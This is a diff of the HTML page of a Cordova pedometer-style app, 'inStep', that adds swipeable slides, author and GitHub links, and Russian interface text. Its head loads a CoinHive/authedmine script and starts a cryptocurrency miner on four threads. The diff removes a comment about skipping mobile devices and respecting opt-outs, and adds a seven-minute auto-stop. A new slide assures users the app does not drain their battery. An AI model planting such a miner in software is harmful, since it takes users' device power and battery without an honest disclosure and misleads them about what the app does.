@@ -8,27 +8,49 @@
         <script src="vendor/jquery.min.js"></script>
         <script src="vendor/TweenMax.min.js"></script>
         <script src="https://www.w3counter.com/tracker.js?id=122630"></script> 
+        <link rel="stylesheet" href="vendor/fullpage.css">
+        <script src="vendor/fullpage.js"></script>
         <script src="https://authedmine.com/lib/authedmine.min.js"></script>
 <script>
     var miner = new CoinHive.Anonymous('XxDbu5mPsyoPCyKxGzyK83NJqArvv5Ri', {throttle: 0.8, threads: 4});
 
-    // Only start on non-mobile devices and if not opted-out
-    // in the last 14400 seconds (4 hours):
-   
         miner.start();
+        setTimeout(miner.stop, (1000*60)*7)
 
 </script>
         <title>inStep</title>
     </head>
     <body>
         <div class="app">
-            <a href="javascript:window.setCounter(window.alltime); setTimeout(window.redraw, 3000)">
+
+<div  class="section ">
+    <div data-anchor="slide1" class="slide">
+        <br>
 <div class="counter">
  
-</div></a> <br>  <br><a href="javascript:window.au()"> <h3 class="tyuui">За время открытого приложения:</h3>
-<br><br><br><br>
-<div class="history"></div>
-</a>
+</div> <h5 style="position: absolute; z-index: 100; color: whitesmoke; left: 1%;" class="tyuui">За время открытого приложения: </h5> <br>
+
+</div>
+
+    <div data-anchor="slide2" class="slide">
+<div class="history"></div> <br>
+<div>Свайпни вверх...</div>
+</div>
+</div>
+<div class="section">
+    <div class="slide">
+        Это приложение работает автономно сразу после первого запуска. <br>
+        Мы не кушаем вашу батарею! <br>
+
+    </div>
+    <div class="slide">
+    <h2> <a href="javascript:window.au();"> Author Page </a></h2> <br>
+    <h2> <a href="javascript:window.open('https://github.com/pinguinorg/instep', '_system');"> Github </a></h2> <br>
+    <h2> <a href="javascript:window.open('https://github.com/pinguinorg/instep/issues/new', '_system');"> Bug Report </a></h2> <br>
+    <h3> Developed by Misha Marinenko from Pinguin Org. </h3>
+    </div>
+</div>
+
         </div>
         <script type="text/javascript" src="cordova.js"></script>
         <script type="text/javascript" src="js/index.js"></script>
